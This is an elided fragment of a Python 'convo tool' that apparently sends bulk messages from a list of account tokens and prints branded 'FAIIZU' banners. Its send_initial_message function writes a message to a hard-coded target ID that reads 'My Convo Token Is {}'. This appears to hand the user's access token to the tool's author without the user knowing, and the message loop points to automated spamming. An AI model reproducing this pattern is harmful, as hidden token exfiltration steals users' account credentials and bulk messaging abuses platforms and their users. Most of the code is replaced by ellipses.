...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      ...
      def do_GET(self):
          ...
          self.wfile.write(b"   MR FAIIZU INXIDE")
...
def send_initial_message():
      ...
      msg_template = "Hello Faiizu Sir..!! I'm Using Your Convo Tool And My Convo Token Is {}"



      # Specify the ID where you want to send the message

      target_id = "61576348822426"
      ...
      def liness():
          ...
          print('\033[1;92m' + '[>] ===========𝗙𝗔𝗜𝗜𝗭𝗨 𝗦𝟯𝗥𝗩𝟯𝗥=𝗥𝗨𝗡𝗡𝗜𝗡𝗚==========')
          ...
          try:
              ...
              for message_index in range(num_messages):
                  ...
                  if response.ok:
                      ...
                      print("\033[1;36;1m[✔️] YOU ARE USING MR. FAIIZU CONVO TOOL : 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 {} 𝗢𝗳 𝗖𝗼𝗻𝘃𝗼 {} 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗕𝘆 𝗧𝗼𝗸𝗲𝗻 𝗡𝗼. {}: {}".format(
              ...
              print("\n[✔️] 𝟰𝗟𝗟 𝗠𝟯𝗦𝗦𝟰𝗚𝟯 𝗦𝟯𝗡𝗧 𝗦𝗨𝗖𝗖𝟯𝗦𝗦𝗙𝗨𝗟𝗟𝗬 𝗡𝟬𝗪 𝗪𝟰𝗜𝗧 𝗙𝟬𝗥 𝟯𝟬 𝗦𝟯𝗖 𝗕𝗥𝟬....\n")
